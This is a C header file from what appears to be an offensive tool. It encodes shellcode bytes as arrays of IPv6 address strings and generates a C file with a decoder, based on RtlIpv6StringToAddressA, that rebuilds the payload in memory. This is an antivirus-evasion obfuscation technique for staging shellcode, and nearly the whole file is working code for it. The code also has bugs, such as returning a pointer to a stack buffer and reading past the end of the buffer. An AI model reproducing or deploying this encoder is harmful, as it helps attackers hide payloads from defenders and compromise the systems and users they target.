#pragma once
#include <Windows.h>
#include <stdio.h>
typedef unsigned int uint32_t;

//-------------------------------------------------------------------------------------------------------------------------------------------------------------------------//
// genearte the ipv6 representation of the shellcode[i]
const char* GenerateIpv6(uint32_t ip, uint32_t ip1, uint32_t ip2, uint32_t ip3) {
	unsigned char bytes[4], bytes1[4], bytes2[4], bytes3[4];
	char Output[32] , Output1[32], Output2[32], Output3[32];
	char result[128];

	bytes[0] = ip & 0xFF;
	bytes[1] = (ip >> 8) & 0xFF;
	bytes[2] = (ip >> 16) & 0xFF;
	bytes[3] = (ip >> 24) & 0xFF;
	sprintf(Output, "%0.2X%0.2X:%0.2X%0.2X", bytes[3], bytes[2], bytes[1], bytes[0]);

	bytes1[0] = ip1 & 0xFF;
	bytes1[1] = (ip1 >> 8) & 0xFF;
	bytes1[2] = (ip1 >> 16) & 0xFF;
	bytes1[3] = (ip1 >> 24) & 0xFF;
	sprintf(Output1, "%0.2X%0.2X:%0.2X%0.2X", bytes1[3], bytes1[2], bytes1[1], bytes1[0]);

	bytes2[0] = ip2 & 0xFF;
	bytes2[1] = (ip2 >> 8) & 0xFF;
	bytes2[2] = (ip2 >> 16) & 0xFF;
	bytes2[3] = (ip2 >> 24) & 0xFF;
	sprintf(Output2, "%0.2X%0.2X:%0.2X%0.2X", bytes2[3], bytes2[2], bytes2[1], bytes2[0]);


	bytes3[0] = ip3 & 0xFF;
	bytes3[1] = (ip3 >> 8) & 0xFF;
	bytes3[2] = (ip3 >> 16) & 0xFF;
	bytes3[3] = (ip3 >> 24) & 0xFF;
	sprintf(Output3, "%0.2X%0.2X:%0.2X%0.2X", bytes3[3], bytes3[2], bytes3[1], bytes3[0]);

	sprintf(result, "%s:%s:%s:%s", Output, Output1, Output2, Output3);

	//printf("[i] [Generateipv6] %s \n", (const char*)result);

	return (const char*)result;

}


uint32_t Generateipv6Hex(int a, int b, int c, int d) { // x4 -> 1 ipv6
	uint32_t result = ((uint32_t)a << 24) | ((uint32_t)b << 16) | (c << 8) | d;
	//printf("[i] result: 0x%0-8x \n", result);
	return result;
}



//-------------------------------------------------------------------------------------------------------------------------------------------------------------------------//
// generate the ipv6 output representation of the shellcode
void Generateipv6Output(SIZE_T ShellcodeSize, unsigned char* FinallShell, PBOOL Success) {
	if (!*Success) {
		return;
	}
	char WriteHeader[256] = "#include <Windows.h>\n#include <stdio.h>\n#include <Ip2string.h>\n#pragma comment(lib, \"Ntdll.lib\")\n\n#ifndef NT_SUCCESS\n#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)\n#endif\n";
	char WriteConfig[128], CharIP[128];

	char WriteDecoderFunc[1024] = "BOOL DecodeIPv6Fuscation(const char* IPV6[], PVOID LpBaseAddress) {\n\tPCSTR Terminator = NULL;\n\tPVOID LpBaseAddress2 = NULL;\n\tNTSTATUS STATUS;\n\tint i = 0;\n\tfor (int j = 0; j < ElementsNumber; j++) {\n\t\tLpBaseAddress2 = PVOID((ULONG_PTR)LpBaseAddress + i);\n\t\tSTATUS = RtlIpv6StringToAddressA((PCSTR)IPV6[j], &Terminator, (in6_addr*)LpBaseAddress2);\n\t\tif (!NT_SUCCESS(STATUS)) {\n\t\t\tprintf(\"[!] RtlIpv6StringToAddressA failed for %s result %x\", IPV6[j], STATUS);\n\t\t\treturn FALSE;\n\t\t}\n\t\telse {\n\t\t\ti = i + 16;\n\t\t}\n\t}\n\treturn TRUE;\n}\n";
	WriteFile(PayloadData.hFile, WriteHeader, strlen(WriteHeader), NULL, NULL);
	WriteFile(PayloadData.hFile, "\nconst char * IPv6Shell [] = { \n\t", strlen("\nconst char * IPv6Shell [] = { \n\t"), NULL, NULL);

	int c = 16, C = 0;
	uint32_t HexVal;
	const char* IP = NULL;
	for (int i = 0; i <= ShellcodeSize; i++) {
		if (c == 16) {
			C++;
			IP = GenerateIpv6(
				Generateipv6Hex(FinallShell[i], FinallShell[i + 1], FinallShell[i + 2], FinallShell[i + 3]),
				Generateipv6Hex(FinallShell[i + 4], FinallShell[i + 5], FinallShell[i + 6], FinallShell[i + 7]),
				Generateipv6Hex(FinallShell[i + 8], FinallShell[i + 9], FinallShell[i + 10], FinallShell[i + 11]),
				Generateipv6Hex(FinallShell[i + 12], FinallShell[i + 13], FinallShell[i + 14], FinallShell[i + 15])
			);
			if (i == ShellcodeSize - 16) {
				sprintf(CharIP, "\"%s\"", IP);
				WriteFile(PayloadData.hFile, CharIP, strlen(CharIP), NULL, NULL);
				break;
			}
			else {
				sprintf(CharIP, "\"%s\", ", IP);
				WriteFile(PayloadData.hFile, CharIP, strlen(CharIP), NULL, NULL);
			}
			c = 1;
			if (C % 6 == 0) {
				WriteFile(PayloadData.hFile, "\n\t", strlen("\n\t"), NULL, NULL);
			}
		}
		else {
			c++;
		}
	}
	WriteFile(PayloadData.hFile, "\n};\n", strlen("\n};\n"), NULL, NULL);
	sprintf(WriteConfig, "#define ElementsNumber %d\n#define SizeOfShellcode %d\n\n", C, (unsigned int)ShellcodeSize);
	WriteFile(PayloadData.hFile, WriteConfig, strlen(WriteConfig), NULL, NULL);
	WriteFile(PayloadData.hFile, WriteDecoderFunc, strlen(WriteDecoderFunc), NULL, NULL);
	CloseHandle(PayloadData.hFile);

	*Success = TRUE;
}
//-------------------------------------------------------------------------------------------------------------------------------------------------------------------------//
// print shellcode to the screen directly 
/*
void Generateipv6Output(SIZE_T ShellcodeSize, unsigned char* FinallShell, PBOOL Success) {
	if (!*Success) {
		return;
	}
	printf("\nconst char * IPv6Shell [] = { \n\t");
	int c = 16, C = 0;
	uint32_t HexVal;
	const char* IP = NULL;
	for (int i = 0; i <= ShellcodeSize; i++) {
		if (c == 16) {
			C++;
			IP = GenerateIpv6(
				Generateipv6Hex(FinallShell[i]      , FinallShell[i + 1]  ,  FinallShell[i + 2]  ,  FinallShell[i + 3] ) ,
				Generateipv6Hex(FinallShell[i + 4]  , FinallShell[i + 5]  ,  FinallShell[i + 6]  ,  FinallShell[i + 7] ) ,
				Generateipv6Hex(FinallShell[i + 8]  , FinallShell[i + 9]  ,  FinallShell[i + 10] ,  FinallShell[i + 11]) ,
				Generateipv6Hex(FinallShell[i + 12] , FinallShell[i + 13] ,  FinallShell[i + 14] ,  FinallShell[i + 15])
			);
			if (i == ShellcodeSize - 16) {
				printf("\"%s\"", IP);
				break;
			}
			else {
				printf("\"%s\", ", IP);
			}
			c = 1;
			if (C % 6 == 0) {
				printf("\n\t");
			}
		}
		else {
			c++;
		}
	}

	printf("};\n");
	printf("#define ElementsNumber %d\n", C);
	printf("#define SizeOfShellcode %d\n", (unsigned int)ShellcodeSize);
	*Success = TRUE;
}

*/
